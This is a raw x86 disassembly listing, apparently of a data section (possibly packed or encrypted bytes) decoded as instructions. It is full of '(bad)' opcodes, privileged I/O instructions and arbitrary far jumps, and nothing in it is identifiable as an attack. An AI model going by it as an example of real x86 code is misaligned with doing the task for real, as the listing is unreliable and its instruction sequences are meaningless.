  40e079:	fild   DWORD PTR [ebp+0x1e]
  40e07c:	(bad)  
  40e07e:	icebp  
  40e07f:	test   BYTE PTR [ebx],dl
  40e081:	xchg   ecx,eax
  40e082:	add    al,0x8c
  40e084:	(bad)  
  40e085:	pop    esp
  40e086:	cmp    eax,DWORD PTR [esi+0xb8250b8]
  40e08c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e08d:	verw   WORD PTR [esi-0x5c60429]
  40e094:	inc    esi
  40e095:	enter  0x6b05,0xf9
  40e099:	and    al,0xea
  40e09b:	jmp    0x40e070
  40e09d:	mov    cl,0x40
  40e09f:	and    DWORD PTR [ecx],edi
  40e0a1:	jle    0x40e0e3
  40e0a3:	add    BYTE PTR [ebx],0x97
  40e0a6:	pop    edx
  40e0a7:	jge    0x40e11c
  40e0a9:	popa   
  40e0aa:	dec    eax
  40e0ab:	scas   al,BYTE PTR es:[edi]
  40e0ac:	ja     0x40e0c6
  40e0ae:	fcomp  DWORD PTR [esi+0xa]
  40e0b1:	retf   
  40e0b2:	nop
  40e0b3:	push   ds
  40e0b4:	inc    ebx
  40e0b5:	dec    esp
  40e0b6:	imul   ecx,DWORD PTR [ecx],0xdc5d37ab
  40e0bc:	inc    ebx
  40e0bd:	mov    ebp,0x48de2db8
  40e0c2:	xor    DWORD PTR [ebp+0x17],0xa6f4bb4a
  40e0c9:	jae    0x40e0af
  40e0cb:	xor    eax,0xc01071b6
  40e0d0:	mov    bl,0x8a
  40e0d2:	inc    ecx
  40e0d3:	(bad)  
  40e0d4:	sub    DWORD PTR [ebp-0x426d5a05],esp
  40e0da:	xor    eax,0x37efa0fb
  40e0df:	jg     0x40e109
  40e0e1:	ret    
  40e0e2:	jg     0x40e114
  40e0e4:	inc    esp
  40e0e5:	fcmovnb st,st(5)
  40e0e7:	(bad)  
  40e0e9:	imul   esi,DWORD PTR [ebx],0x6c
  40e0ec:	jl     0x40e137
  40e0ee:	jo     0x40e0f6
  40e0f0:	stos   DWORD PTR es:[edi],eax
  40e0f1:	mov    dl,0x8d
  40e0f3:	sub    al,0x45
  40e0f5:	add    DWORD PTR [esp+ebx*1-0x6a92151a],ebp
  40e0fc:	or     BYTE PTR [eax-0x5660cd8d],dl
  40e102:	xchg   BYTE PTR [ebx-0x3e0c3954],dl
  40e108:	popf   
  40e109:	inc    eax
  40e10a:	stc    
  40e10b:	int3   
  40e10c:	sahf   
  40e10d:	loopne 0x40e15d
  40e10f:	(bad)  
  40e110:	pop    esp
  40e111:	mov    ah,0x1b
  40e113:	ins    BYTE PTR es:[edi],dx
  40e114:	xchg   esi,esi
  40e116:	in     al,dx
  40e117:	mov    DWORD PTR [ecx],eax
  40e119:	pop    edi
  40e11a:	sub    eax,0xadbdb397
  40e11f:	outs   dx,DWORD PTR ds:[esi]
  40e120:	mov    cl,0x7a
  40e122:	pop    edi
  40e123:	icebp  
  40e124:	push   esi
  40e125:	mov    esp,0xd5f5f038
  40e12a:	cmp    al,0x50
  40e12c:	out    0x81,al
  40e12e:	sub    DWORD PTR [ecx+0x21],edx
  40e131:	fcom   DWORD PTR [edi]
  40e133:	mov    ds:0x3b88e4b,eax
  40e138:	cmc    
  40e139:	(bad)  
  40e13a:	or     al,0x81
  40e13c:	cmc    
  40e13d:	add    DWORD PTR [edx-0xa],ecx
  40e140:	fisubr DWORD PTR [eax+0x77]
  40e143:	push   edx
  40e144:	jno    0x3ecb917
  40e14a:	xor    eax,0x3420f5bb
  40e14f:	test   DWORD PTR ds:0xb5ec4550,edi
  40e155:	rcr    DWORD PTR [esi+0x69c13204],1
  40e15b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e15c:	mov    ch,0x15
  40e15e:	mov    DWORD PTR [edi+0x373d6e96],ebp
  40e164:	in     eax,0x54
  40e166:	mov    ds:0x1dc658f1,al
  40e16b:	cld    
  40e16c:	mov    ebx,0xa0fdec18
  40e171:	aad    0x5d
  40e173:	jo     0x40e1ce
  40e175:	in     al,0x25
  40e177:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e178:	cmp    al,0x0
  40e17a:	add    BYTE PTR [eax],al
  40e17c:	add    BYTE PTR [eax],al
  40e17e:	add    BYTE PTR [edx-0x406b4a4f],bl
  40e184:	xchg   esp,eax
  40e185:	mov    ebx,0x5d8b00bf
  40e18a:	sbb    edx,esi
  40e18c:	jg     0x40e11b
  40e18e:	jnp    0x40e133
  40e190:	call   0x762e195
  40e195:	add    BYTE PTR [eax],al
  40e197:	mov    ds:0x91daf5cd,eax
  40e19c:	pop    ebp
  40e19d:	(bad)  
  40e19e:	(bad)  
  40e19f:	xor    BYTE PTR [ebp+0x4996748d],al
  40e1a5:	sbb    eax,0x19b7374f
  40e1aa:	push   ss
  40e1ab:	ss pop eax
  40e1ad:	cmp    eax,0x7eab5eb7
  40e1b2:	mov    edx,0xd8a46fb
  40e1b7:	xchg   ebp,eax
  40e1b8:	(bad)  
  40e1b9:	popa   
  40e1ba:	sub    eax,0x2aae26a5
  40e1bf:	xor    al,0xa4
  40e1c1:	sub    ch,BYTE PTR [eax+0x68]
  40e1c4:	mov    al,BYTE PTR cs:[edx]
  40e1c7:	les    ecx,FWORD PTR [ebp-0x71]
  40e1ca:	xor    dh,bh
  40e1cc:	(bad)  
  40e1cd:	(bad)  [esi+0x3cc870cc]
  40e1d3:	int3   
  40e1d4:	push   ss
  40e1d5:	sbb    al,0x2e
  40e1d7:	or     DWORD PTR [ebx-0x2a],esp
  40e1da:	push   ebp
  40e1db:	iret   
  40e1dc:	inc    edx
  40e1dd:	imul   DWORD PTR [edi+0x56a764d9]
  40e1e3:	popf   
  40e1e4:	adc    eax,0xb33e6985
  40e1e9:	jno    0x40e24c
  40e1eb:	add    ah,cl
  40e1ed:	lock xchg BYTE PTR [ecx-0x6ffebf40],ah
  40e1f4:	ins    BYTE PTR es:[edi],dx
  40e1f5:	jl     0x40e265
  40e1f7:	adc    ecx,DWORD PTR [eax-0x346e11ad]
  40e1fd:	push   ebx
  40e1fe:	xchg   ebx,eax
  40e1ff:	fwait
  40e200:	shl    DWORD PTR [edi-0x2e],1
  40e203:	fdivr  QWORD PTR [ebx+0x1695e885]
  40e209:	pop    ss
  40e20a:	and    BYTE PTR [edx],dh
  40e20c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e20d:	xchg   ebx,eax
  40e20e:	xchg   ebx,eax
  40e20f:	xchg   ebx,eax
  40e210:	lds    ecx,FWORD PTR [eax]
  40e212:	xchg   ebp,eax
  40e213:	pusha  
  40e214:	imul   ebx,DWORD PTR [ecx+0x6d7f10e8],0x9a68028d
  40e21e:	pop    eax
  40e21f:	ficomp WORD PTR [edx-0x6]
  40e222:	iret   
  40e223:	neg    edx
  40e225:	dec    edx
  40e226:	dec    esp
  40e227:	fsubp  st(6),st
  40e229:	and    eax,0x3700339f
  40e22e:	call   0xe26b:0x99335ab5
  40e235:	hlt    
  40e236:	pop    edi
  40e237:	or     DWORD PTR ds:[ecx+0x241e9764],edx
  40e23e:	sbb    BYTE PTR [esi+0x47519b2a],cl
  40e244:	or     dh,BYTE PTR [eax+ecx*2+0x56f8ef75]
  40e24b:	mov    esi,0x9251335
  40e250:	pop    edi
  40e251:	les    ebp,FWORD PTR [ebx]
  40e253:	rcl    DWORD PTR [eax],cl
  40e255:	cmp    ebp,DWORD PTR ds:[eax+eax*4+0x75b1a0fe]
  40e25d:	cdq    
  40e25e:	xor    eax,DWORD PTR [esp+edi*8+0x618e98c]
  40e265:	or     eax,0x9cf78c3e
  40e26a:	clc    
  40e26b:	inc    edx
  40e26c:	add    eax,0x15feb94e
  40e271:	stos   DWORD PTR es:[edi],eax
  40e272:	nop
  40e273:	mov    dh,0x9
  40e275:	push   edx
  40e276:	add    eax,0x131ba291
  40e27b:	jae    0x40e21f
  40e27d:	inc    ebp
  40e27e:	je     0x40e2e7
  40e280:	jno    0x40e260
  40e282:	pusha  
  40e283:	push   esp
  40e284:	add    eax,0x84d79f8d
  40e289:	icebp  
  40e28a:	mov    dl,0xad
  40e28c:	in     al,dx
  40e28d:	mov    bl,0x8d
  40e28f:	rcl    BYTE PTR [ecx+edx*8-0x56],cl
  40e293:	and    DWORD PTR [ebx],ebx
  40e295:	push   esi
  40e296:	sub    al,0x9a
  40e298:	cmp    ah,ch
  40e29a:	in     eax,0x7f
  40e29c:	loop   0x40e2dd
  40e29e:	and    al,0x27
  40e2a0:	pop    esp
  40e2a1:	jecxz  0x40e2b0
  40e2a3:	sub    al,0x14
  40e2a5:	hlt    
  40e2a6:	adc    al,0xeb
  40e2a8:	call   0x3b2a:0x92a768dc
  40e2af:	sbb    esi,ebp
  40e2b1:	push   ecx
  40e2b2:	sahf   
  40e2b3:	cmp    eax,0x118566be
  40e2b8:	data16 int3 
  40e2ba:	retf   
  40e2bb:	fcom   QWORD PTR [eax]
  40e2bd:	jl     0x40e299
  40e2bf:	jg     0x40e274
  40e2c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e2c2:	aas    
  40e2c3:	popa   
  40e2c4:	sub    al,0x29
  40e2c6:	xor    ebp,edx
  40e2c8:	inc    ebx
  40e2c9:	int    0xd8
  40e2cb:	xchg   DWORD PTR [ebx+0x3b81292],ebx
  40e2d1:	ret    
  40e2d2:	hlt    
  40e2d3:	mov    esi,0x42458190
  40e2d8:	xor    al,0x97
  40e2da:	mov    WORD PTR [edi-0x27c71f51],ss
  40e2e0:	jge    0x40e2dd
  40e2e2:	and    ebx,DWORD PTR [edx+0x1f]
  40e2e5:	mov    edx,0x9f6be926
  40e2ea:	fld    QWORD PTR [eax+0x2b7e6f4e]
  40e2f0:	jecxz  0x40e29d
  40e2f2:	out    dx,al
  40e2f3:	adc    dl,BYTE PTR [eax-0x2c]
  40e2f6:	(bad)  
  40e2f7:	cmp    BYTE PTR [edx+0x2b55f779],bh
  40e2fd:	jp     0x40e289
  40e2ff:	out    0xa4,eax
  40e301:	aaa    
  40e302:	nop    DWORD PTR [edx+0x713a0f0f]
  40e309:	push   ecx
  40e30a:	cmc    
  40e30b:	(bad)  
  40e30c:	mov    cs,WORD PTR [edx+0x48]
  40e30f:	push   edx
  40e310:	mov    ch,0x2a
  40e312:	cmp    bl,dl
  40e314:	dec    esi
  40e315:	cmp    dl,al
  40e317:	lea    edx,[edi+0x63]
  40e31a:	stos   DWORD PTR es:[edi],eax
  40e31b:	ss ret 
  40e31d:	dec    esp
  40e31e:	xchg   edi,eax
  40e31f:	inc    eax
  40e320:	xchg   ebx,eax
  40e321:	pop    DWORD PTR [edi+eax*2]
  40e324:	mov    edi,0xdc2f75c8
  40e329:	cmp    eax,0x2761b7d7
  40e32e:	dec    ebx
  40e32f:	call   0xf33a:0xff87e3c8
  40e336:	lods   al,BYTE PTR ds:[esi]
  40e337:	out    0x95,eax
  40e339:	aaa    
  40e33a:	(bad)  
  40e33b:	mov    ebp,0x9eea57d9
  40e340:	sbb    eax,0x3ebb7ce7
  40e345:	repz jle 0x40e367
  40e348:	imul   ebp,DWORD PTR [ebx+0x292e19c1],0xada9fb18
  40e352:	push   ss
  40e353:	xchg   DWORD PTR [edx],edx
  40e355:	bound  esi,QWORD PTR [ecx]
  40e357:	int3   
  40e358:	test   al,0x74
  40e35a:	repz inc esp
  40e35c:	cmc    
  40e35d:	cmp    al,0x5d
  40e35f:	sub    al,0x9a
  40e361:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e362:	ss push ecx
  40e364:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e365:	pop    ds
  40e366:	sbb    edx,edx
  40e368:	pop    ss
  40e369:	aad    0x10
  40e36b:	std    
  40e36c:	add    ecx,DWORD PTR es:[eax+edi*8]
  40e370:	fmul   DWORD PTR [edx+0x48362e8b]
  40e376:	xchg   edx,eax
  40e377:	jmp    0x346c:0x60dff9e
  40e37e:	jnp    0x40e3f0
  40e380:	ret    
  40e381:	xor    eax,0x5ec6d6c7
  40e386:	gs mov ebp,0xc0c99c5
  40e38c:	outs   dx,DWORD PTR ds:[esi]
  40e38d:	jl     0x40e3a4
  40e38f:	out    0x8,eax
  40e391:	imul   BYTE PTR [ebx+edx*2-0x30]
  40e395:	jp     0x40e34f
  40e397:	fs enter 0x58f7,0x9a
  40e39c:	sub    DWORD PTR [edx],ebp
  40e39e:	push   ss
  40e39f:	add    eax,0xac1c96
  40e3a4:	mov    DWORD PTR [esp+edi*1-0xf1a335e],eax
  40e3ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e3ac:	mov    ch,0xef
  40e3ae:	pop    esi
  40e3af:	dec    ebp
  40e3b0:	push   ebp
  40e3b1:	sub    bl,al
  40e3b3:	loopne 0x40e40c
  40e3b5:	xor    eax,DWORD PTR [edx-0x155567c0]
  40e3bb:	cli    
  40e3bc:	xor    esp,DWORD PTR [esi]
  40e3be:	adc    esi,edi
  40e3c0:	adc    BYTE PTR [edi+0x2c],ch
  40e3c3:	pop    DWORD PTR [esi-0x18]
  40e3c6:	dec    esp
  40e3c7:	jno    0x40e3b4
  40e3c9:	fist   DWORD PTR [esi-0x61]
  40e3cc:	test   eax,0x37e05bb
  40e3d1:	fcmovu st,st(1)
  40e3d3:	adc    DWORD PTR [edi+ebp*2+0xf],esi
  40e3d7:	xor    edx,ebp
  40e3d9:	cmp    DWORD PTR [ebp-0x47],eax
  40e3dc:	ds jmp 0x9c7e:0xb8b1f6fe
  40e3e4:	push   esp
  40e3e5:	arpl   WORD PTR [edx],dx
  40e3e7:	aas    
  40e3e8:	mov    cl,0xa2
  40e3ea:	cmp    eax,0xfcbdcb51
  40e3ef:	inc    edi
  40e3f0:	add    DWORD PTR [eax],0x1df1db28
  40e3f6:	loopne 0x40e43d
  40e3f8:	add    eax,0xf45c0bd8
  40e3fd:	lds    esp,FWORD PTR [ebx+0x65]
  40e400:	in     eax,dx
  40e401:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e402:	xor    BYTE PTR [eax+0x14],ch
  40e405:	or     eax,0x6047f083
  40e40a:	inc    esi
  40e40b:	scas   eax,DWORD PTR es:[edi]
  40e40c:	inc    ebx
  40e40d:	rcl    BYTE PTR [esi-0x60b03500],cl
  40e413:	adc    ah,BYTE PTR [ebx+0x7d]
  40e416:	mov    eax,ds:0xd2866028
  40e41b:	push   esi
  40e41c:	push   0x3675392b
  40e421:	test   eax,0x3a43637e
  40e426:	and    esp,DWORD PTR [ebp-0xac5c918]
  40e42c:	imul   esi,DWORD PTR cs:[eax+ebp*4],0xffffffce
  40e431:	pushf  
  40e432:	adc    esp,esp
  40e434:	cli    
  40e435:	or     eax,ebp
  40e437:	rcr    BYTE PTR [ecx-0x680dda44],cl
  40e43d:	push   es
  40e43e:	inc    esp
  40e43f:	add    dh,ah
  40e441:	fdiv   st,st(2)
  40e443:	outs   dx,DWORD PTR ds:[esi]
  40e444:	sub    eax,0xe2f863c1
  40e449:	(bad)  
  40e44b:	inc    eax
  40e44c:	and    bh,BYTE PTR [eax-0x7c45919]
  40e452:	xchg   DWORD PTR [ebx],eax
  40e454:	int    0x24
  40e456:	popa   
  40e457:	retf   0xb40c
  40e45a:	sbb    BYTE PTR [esi+0x44],bl
  40e45d:	dec    esp
  40e45e:	mov    ebx,0x1b3116d0
  40e463:	es (bad) 
  40e466:	int3   
  40e467:	fwait
  40e468:	test   al,0x15
  40e46a:	arpl   WORD PTR [edx-0x351d9aa5],si
  40e470:	inc    edx
  40e471:	loope  0x40e488
  40e473:	xchg   edx,eax
  40e474:	fbld   TBYTE PTR [esi-0xc]
  40e477:	stos   BYTE PTR es:[edi],al
  40e478:	dec    ecx
  40e479:	ret    
  40e47a:	shl    DWORD PTR [edx+ecx*8],1
  40e47d:	or     DWORD PTR [ebp+0x1ec406a0],esi
  40e483:	(bad)  
  40e484:	adc    DWORD PTR [ecx],eax
  40e486:	mov    al,0xb6
  40e488:	frstor [ebp+0x405245de]
  40e48e:	sub    al,0xfa
  40e490:	xor    al,0x90
  40e492:	adc    DWORD PTR [ebx-0x3c],0xaf9c13f9
  40e499:	ret    
  40e49a:	cmp    al,0x85
  40e49c:	cdq    
  40e49d:	sub    DWORD PTR [edx+0x66],edi
  40e4a0:	adc    eax,0x80b26c2
  40e4a5:	mov    dl,BYTE PTR [ebx+0x18a9eaa8]
  40e4ab:	mov    fs,ebx
  40e4ad:	sahf   
  40e4ae:	(bad)
  40e4b1:	mov    WORD PTR [eax-0x78a10141],?
  40e4b7:	fidiv  DWORD PTR [ebp-0x3f1fa520]
  40e4bd:	or     BYTE PTR [edi-0x75],bl
  40e4c0:	mov    al,BYTE PTR [edi]
  40e4c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e4c3:	mov    ds:0x3c6e1e2b,al
  40e4c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e4c9:	loop   0x40e537
  40e4cb:	(bad)  
  40e4cd:	daa    
  40e4ce:	imul   edx,DWORD PTR [edx],0xe4dfd3f2
  40e4d4:	dec    edi
  40e4d5:	pop    esp
  40e4d6:	test   BYTE PTR ds:0xfb400574,ch
  40e4dc:	imul   esi,ebx,0x3d
  40e4df:	sti    
  40e4e0:	out    0xbf,al
  40e4e2:	push   es
  40e4e3:	xchg   edi,eax
  40e4e4:	adc    edx,DWORD PTR [edx-0xf47ed76]
  40e4ea:	adc    cl,dl
  40e4ec:	aad    0xac
  40e4ee:	push   cs
  40e4ef:	fs xlat BYTE PTR ss:[ebx]
  40e4f2:	push   esp
  40e4f3:	scas   eax,DWORD PTR es:[edi]
  40e4f4:	adc    esi,edi
  40e4f6:	int3   
  40e4f7:	loope  0x40e4ea
  40e4f9:	dec    edi
  40e4fa:	mov    edi,0xfdd11754
  40e4ff:	loopne 0x40e50e
  40e501:	push   es
  40e502:	pop    edi
  40e503:	cdq    
  40e504:	mov    ah,0xa4
  40e506:	ret    0xa64a
  40e509:	sbb    eax,0xbaad9d6c
  40e50e:	jne    0x40e524
  40e510:	cli    
  40e511:	call   0x6536d2e3
  40e516:	int    0x5d
  40e518:	push   ebx
  40e519:	pop    edi
  40e51a:	call   0x7fd8:0xa4a80222
  40e521:	imul   edx,DWORD PTR [eax+0x5],0x53
  40e525:	pop    ss
  40e526:	loop   0x40e5a4
  40e528:	call   FWORD PTR [esi+0x7272e23e]
  40e52e:	scas   eax,DWORD PTR es:[edi]
  40e52f:	and    DWORD PTR [eax+0x70],ebp
  40e532:	int    0xd4
  40e534:	mov    bl,0x7a
  40e536:	dec    esi
  40e537:	and    DWORD PTR [ebx],edx
  40e539:	stc    
  40e53a:	es loopne 0x40e57f
  40e53d:	adc    bh,0x8d
  40e540:	stos   BYTE PTR es:[edi],al
  40e541:	xor    DWORD PTR [ecx-0x6ec62fa2],ebp
  40e547:	push   esi
  40e548:	lods   eax,DWORD PTR ds:[esi]
  40e549:	out    0xc5,al
  40e54b:	adc    BYTE PTR [ebp+edi*4+0x66],dl
  40e54f:	push   ss
  40e550:	fimul  WORD PTR [ecx+edx*8+0x12]
  40e554:	stos   DWORD PTR es:[edi],eax
  40e555:	mov    BYTE PTR [ebx-0x5d],dh
  40e558:	fnstsw WORD PTR [eax-0x1eecae2d]
  40e55e:	inc    edi
  40e55f:	arpl   WORD PTR [esi+0x511afb22],sp
  40e565:	add    DWORD PTR [edx+0x3d],eax
  40e568:	xor    eax,0x61ed481d
  40e56d:	sbb    ch,BYTE PTR [edi]
  40e56f:	int3   
  40e570:	xchg   edi,eax
  40e571:	int3   
  40e572:	stos   BYTE PTR es:[edi],al
  40e573:	xchg   ebp,eax
  40e574:	or     bh,ch
  40e576:	inc    ebp
  40e577:	dec    eax
  40e578:	push   ss
  40e579:	push   ds
  40e57a:	sub    al,BYTE PTR [ebx-0x7dfef60d]
  40e580:	fs out dx,eax
  40e582:	stos   DWORD PTR es:[edi],eax
  40e583:	push   ecx
  40e584:	pushf  
  40e585:	or     eax,0x55afaae8
  40e58a:	mov    cl,BYTE PTR [ebx+0x2c2acd19]
  40e590:	cmp    bh,BYTE PTR [ebp-0x2b]
  40e593:	fcomp  DWORD PTR [ebx+ebx*4]
  40e596:	retf   0x1e3f
  40e599:	clts   
  40e59b:	sbb    eax,0xe6f3991
  40e5a0:	mov    ebp,0xd6bc4860
  40e5a5:	out    dx,eax
  40e5a6:	jp     0x40e5a4
  40e5a8:	(bad)  
  40e5aa:	sbb    bh,al
  40e5ac:	sahf   
  40e5ad:	jmp    0x494e:0xd81b1ca2
  40e5b4:	sub    DWORD PTR ds:0xf7fdbdb8,ebx
  40e5ba:	mov    ebx,0xce4e4bf3
  40e5bf:	stos   DWORD PTR es:[edi],eax
  40e5c0:	mov    eax,ds:0x8751d32e
  40e5c5:	faddp  st(0),st
  40e5c7:	loope  0x40e5b3
  40e5c9:	or     DWORD PTR [esi-0x1c585597],ecx
  40e5cf:	xchg   DWORD PTR [edi-0x56],ebx
  40e5d2:	cld    
  40e5d3:	pop    ds
  40e5d4:	add    eax,0x7be73b87
  40e5d9:	mov    bl,0xc5
  40e5db:	or     eax,DWORD PTR [edi-0xd6f7d99]
  40e5e1:	sub    DWORD PTR [esp+ecx*8-0x50],esp
  40e5e5:	pusha  
  40e5e6:	shl    ebx,0xc9
  40e5e9:	es jmp 0xc8707297
  40e5ef:	call   0x4e7e:0xcbd96526
  40e5f6:	out    dx,ax
  40e5f8:	pop    esp
  40e5f9:	xor    eax,0xffffffbb
  40e5fc:	xadd   BYTE PTR [eax-0x6e],dh
  40e600:	cmp    eax,0x31517fb1
  40e605:	sbb    ebp,DWORD PTR [edx]
  40e607:	pop    edx
  40e608:	cwde   
  40e609:	lock mov al,0x28
  40e60c:	jb     0x40e60d
  40e60e:	aaa    
  40e60f:	in     al,dx
  40e610:	push   ecx
  40e611:	pop    edi
  40e612:	loopne 0x40e5d8
  40e614:	in     al,0xa2
  40e616:	ins    DWORD PTR es:[edi],dx
  40e617:	xchg   eax,esi
  40e619:	jg     0x40e633
  40e61b:	shl    BYTE PTR ds:0x9460ba3d,cl
  40e621:	mov    es,ebp
  40e623:	call   0x68ec:0x87f48a3d
  40e62a:	je     0x40e6a7
  40e62c:	sbb    BYTE PTR [edx-0x3fc7be15],0xaa
  40e633:	sbb    ebp,DWORD PTR [edx]
  40e635:	je     0x40e694
  40e637:	jecxz  0x40e5bc
  40e639:	call   0xccf2:0x7b6ee43d
  40e640:	sbb    DWORD PTR [eax+0x49],ebp
  40e643:	arpl   WORD PTR [eax],bx
  40e645:	inc    edx
  40e646:	enter  0xd2e4,0xa2
  40e64a:	test   al,0xee
  40e64c:	mov    esp,0xac313874
  40e651:	dec    ecx
  40e652:	ds push 0x8546e4a7
  40e658:	pop    ebp
  40e659:	mov    ds:0x6c67f6ef,al
  40e65e:	imul   esi,DWORD PTR [esi+ecx*8-0xc73743d],0xffffffd9
  40e666:	test   DWORD PTR [ebp+0x64],esp
  40e669:	jne    0x40e64f
  40e66b:	pop    ds
  40e66c:	(bad)  
  40e66d:	cmp    ebx,esp
  40e66f:	shr    DWORD PTR [ebx],1
  40e671:	mov    esi,0x7e3be2ca
  40e676:	jno    0x40e671
  40e678:	adc    BYTE PTR [edx],ch
  40e67a:	ret    0x2bc2
  40e67d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e67e:	les    ebx,FWORD PTR [ebp+0x617339b6]
  40e684:	repz push 0xe96bab18
  40e68a:	mov    ebp,0x1c1f2504
  40e68f:	and    DWORD PTR [ecx+0x6e],edx
  40e692:	ins    BYTE PTR es:[edi],dx
  40e693:	shl    BYTE PTR [eax],cl
  40e695:	arpl   WORD PTR [ebx],cx
  40e697:	pushf  
  40e698:	sub    eax,0xb88367ea
  40e69d:	lds    edx,FWORD PTR [edi+0x93ae509]
  40e6a3:	xchg   DWORD PTR [ecx+0x3c],eax
  40e6a6:	nop
  40e6a7:	sub    cl,BYTE PTR ds:0x3b5a8527
  40e6ad:	mov    al,0xcd
  40e6af:	jnp    0x40e66a
  40e6b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e6b2:	ret    
  40e6b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e6b4:	les    ebp,FWORD PTR [eax-0xe]
  40e6b7:	imul   esp,DWORD PTR [edx+0x146d989e],0x9e1f92de
  40e6c1:	add    bl,BYTE PTR [ecx+0x2f28fbab]
  40e6c7:	xor    DWORD PTR [edx-0x63e79928],ebx
  40e6cd:	adc    BYTE PTR [esi+0x165fda43],0x9e
  40e6d4:	xor    cl,dh
  40e6d6:	pop    ebx
  40e6d7:	cmp    BYTE PTR [ecx-0x65ec6897],bh
  40e6dd:	mov    edx,0x90887434
  40e6e2:	out    0x15,eax
  40e6e4:	retf   0xe599
  40e6e7:	mov    cl,0x14
  40e6e9:	nop
  40e6ea:	call   0x7fd4ef36
  40e6ef:	sahf   
  40e6f0:	mov    cl,0xcf
  40e6f2:	cmp    bl,BYTE PTR [eax-0x6afe62fc]
  40e6f8:	js     0x40e756
  40e6fa:	sub    al,0x79
  40e6fc:	int3   
  40e6fd:	jno    0x40e6d4
  40e6ff:	xor    dh,bl
  40e701:	(bad)  
  40e703:	repnz cmp ebx,DWORD PTR [eax-0x1f3d6971]
  40e70a:	adc    eax,DWORD PTR [edi]
  40e70c:	push   edi
  40e70d:	xchg   DWORD PTR [ebp-0x37],esp
  40e710:	add    bh,dh
  40e712:	sbb    eax,0xd53dc737
  40e717:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e718:	arpl   WORD PTR [ecx-0x2f6bf0e0],sp
  40e71e:	adc    BYTE PTR [ecx],ah
  40e720:	push   0xb8409292
  40e725:	in     eax,dx
  40e726:	mov    DWORD PTR [ebp-0x43837578],esp
  40e72c:	jp     0x40e77b
  40e72e:	cdq    
  40e72f:	test   BYTE PTR [esi+0x51],bl
  40e732:	test   al,0x83
  40e734:	cmc    
  40e735:	sbb    DWORD PTR [edx],eax
  40e737:	pop    ecx
  40e738:	inc    ebx
  40e739:	arpl   bp,ax
  40e73b:	daa    
  40e73c:	pop    es
  40e73d:	mov    ecx,edx
  40e73f:	in     eax,0x48
  40e741:	mov    ah,BYTE PTR [edi]
  40e743:	jno    0x40e73a
  40e745:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e746:	push   0x2d04481e
  40e74b:	and    cl,bl
  40e74d:	xor    eax,0xa20a5000
  40e752:	pop    ecx
  40e753:	add    bh,BYTE PTR [eax-0x101eb68c]
  40e759:	fbld   TBYTE PTR [ecx-0x51]
  40e75c:	dec    esp
  40e75d:	cmp    al,0x57
  40e75f:	add    edx,DWORD PTR [edx]
  40e761:	call   0xefe5:0xb09a4c7a
  40e768:	xor    dh,BYTE PTR [ebx+0x74]
  40e76b:	jge    0x40e774
  40e76d:	je     0x40e764
  40e76f:	cmp    ch,BYTE PTR ds:0xeab7
  40e774:	push   esi
  40e775:	and    bh,ah
  40e777:	cs xchg ecx,eax
  40e779:	inc    ebx
  40e77a:	out    dx,eax
  40e77b:	jb     0x40e719
  40e77d:	push   ecx
  40e77e:	and    al,0x6e
  40e780:	mov    esp,0xdb5e25fd
  40e785:	stos   DWORD PTR es:[edi],eax
  40e786:	stos   BYTE PTR es:[edi],al
  40e787:	jb     0x40e7f9
  40e789:	sub    bh,BYTE PTR [edx]
  40e78b:	ret    0x3b86
  40e78e:	loop   0x40e78e
  40e790:	or     BYTE PTR [esi-0x45],0xb0
  40e794:	mov    fs,ebp
  40e796:	mov    ebx,0x11eac87a
  40e79b:	ds dec ecx
  40e79d:	jns    0x40e7a5
  40e79f:	fdivr  st,st(2)
  40e7a1:	out    0x36,al
  40e7a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e7a4:	fcom   DWORD PTR [ebx+0x22494d41]
  40e7aa:	push   ecx
  40e7ab:	(bad)  
  40e7ac:	adc    al,0x42
  40e7ae:	nop
  40e7af:	xchg   DWORD PTR [ebx+0x13],ecx
  40e7b2:	add    bl,ch
  40e7b4:	hlt    
  40e7b5:	pop    esp
  40e7b6:	imul   eax,DWORD PTR [ebx],0x42da64c1
  40e7bc:	xor    DWORD PTR [edi-0x14],edi
  40e7bf:	xor    ebx,esp
  40e7c1:	inc    esi
  40e7c2:	xlat   BYTE PTR ds:[ebx]
  40e7c3:	inc    ebx
  40e7c4:	scas   al,BYTE PTR es:[edi]
  40e7c5:	fbstp  TBYTE PTR [ecx-0x29]
  40e7c8:	in     eax,0x24
  40e7ca:	dec    DWORD PTR [ebp+0x17]
  40e7cd:	sbb    ebp,DWORD PTR [edx-0x80]
  40e7d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e7d1:	fisubr WORD PTR [ebx-0x4a934c73]
  40e7d7:	sbb    edx,ecx
  40e7d9:	jbe    0x40e75c
  40e7db:	and    ebp,DWORD PTR [edx-0x28]
  40e7de:	jo     0x40e819
  40e7e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e7e1:	bound  esp,QWORD PTR [eax-0x11]
  40e7e4:	mov    ecx,0xbdcc11b
  40e7e9:	jmp    0x48f7:0x2265e72c
  40e7f0:	mov    ds:0xd7c0d84,eax
  40e7f5:	out    dx,eax
  40e7f6:	popa   
  40e7f7:	adc    al,0x45
  40e7f9:	jp     0x40e7fe
  40e7fb:	shl    ch,0x8e
  40e7fe:	cmc    
  40e7ff:	ror    BYTE PTR [ecx],cl
  40e801:	fmul   QWORD PTR [ecx+0x78]
  40e804:	dec    esp
  40e805:	imul   DWORD PTR [edx]
  40e807:	cdq    
  40e808:	dec    edi
  40e809:	ja     0x40e824
  40e80b:	mov    dh,0xca
